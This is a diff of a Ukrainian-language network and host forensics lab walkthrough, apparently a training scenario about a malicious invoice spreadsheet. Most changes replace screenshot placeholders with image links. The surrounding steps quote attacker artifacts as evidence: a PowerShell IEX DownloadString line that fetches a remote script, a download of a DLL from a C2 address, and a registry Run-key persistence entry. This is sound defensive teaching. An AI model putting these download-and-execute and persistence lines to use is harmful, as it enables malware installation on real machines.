@@ -118,8 +118,8 @@ tcpdump -r /home/analyst/scenario/sc06.pcap -n port 53 | grep -A1 "cdn-updates"
 ```bash
 tcpdump -r /home/analyst/scenario/sc06.pcap host 185.156.72.11
 ```
-
-[[VISUAL: Скріншот — TCP сесії до 185.156.72.11 на портах 80 та 8080]]
+![Скріншот — TCP сесії до 185.156.72.11 на портах 80 та 8080](image/image_8.png)
+Скріншот — TCP сесії до 185.156.72.11 на портах 80 та 8080
 
 ### Крок 2.4 — Знайти Excel та PowerShell User-Agent
 
@@ -133,9 +133,8 @@ tcpdump -r /home/analyst/scenario/sc06.pcap -A port 80 | grep -i "excel\|office\
 User-Agent: Microsoft Office/16.0 (Windows NT 10.0; Microsoft Excel 16.0.17126; Pro)
 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; PowerShell/5.1.19041.4648)
 ```
-
-[[VISUAL: Скріншот — два рядки User-Agent виділені]]
-
+![Скріншот — Скріншот — два рядки User-Agent виділені](image/image_9.png)
+Скріншот — два рядки User-Agent виділені
 ### Крок 2.5 — Переглянути payload
 
 ```bash
@@ -162,14 +161,16 @@ POST /cdn/check HTTP/1.1
 User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 10.0; Trident/7.0)
 ```
 
-[[VISUAL: Скріншот tcpdump -A — три секції виділені]]
+![Скріншот — tcpdump -A — три секції виділені](image/image_10.png)
+![Скріншот — tcpdump -A — три секції виділені](image/image_11.png)
+Скріншот tcpdump -A — три секції виділені
 
 ### Крок 2.6 — Підрахувати beacon
 
 ```bash
 tcpdump -r /home/analyst/scenario/sc06.pcap -A host 185.156.72.11 | grep "POST /cdn/check"
 ```
-
+![Скріншот — Підрахувати beacon](image/image_12.png)
 **🔴 Висновок Фази 2:** 8 C2 beacon (~120с інтервал) до `185.156.72.11:8080`. Спроба ексфільтрації — HTTP 403.
 
 ---
@@ -179,7 +180,7 @@ tcpdump -r /home/analyst/scenario/sc06.pcap -A host 185.156.72.11 | grep "POST /
 ### Крок 3.1 — Увійти в контейнер
 
 ```bash
-sudo docker exec -it forensics_sc06_invoice bash
+docker exec -it forensics_sc06_invoice bash
 ```
 
 ### Крок 3.2 — AV Log
@@ -207,8 +208,9 @@ IEX($wc.DownloadString('http://cdn-updates-service.com/invoices/get_payload.ps1'
 HKCU\Software\Microsoft\Windows\CurrentVersion\Run\WinSvcHost
 Value: C:\Users\o.koval\AppData\Local\Temp\svchost_helper.dll
 ```
-
-[[VISUAL: Скріншот av_alerts.log — виділені MACRO-XLSM та PERSIST-REGISTRY-RUN]]
+![Скріншот — Скріншот av_alerts.log](image/image_13.png)
+![Скріншот — Скріншот av_alerts.log](image/image_14.png)
+Скріншот av_alerts.log — виділені MACRO-XLSM та PERSIST-REGISTRY-RUN
 
 ### Крок 3.3 — PowerShell Transcript
 
@@ -224,8 +226,9 @@ PS> $wc2.DownloadFile('http://185.156.72.11/stage2/svchost_helper.dll', $tmpPath
 PS> Set-ItemProperty -Path $regPath -Name 'WinSvcHost' -Value $tmpPath
 PS> New-Object System.Threading.Mutex($false, 'Local\WinSvcHostV2')
 ```
+![Скріншот — PowerShell Transcript](image/image_15.png)
 
-[[VISUAL: Скріншот powershell_transcript.log — виділені IEX, DownloadFile, Mutex]]
+Скріншот powershell_transcript.log — виділені IEX, DownloadFile, Mutex
 
 ### Крок 3.4 — Web Access Log
 
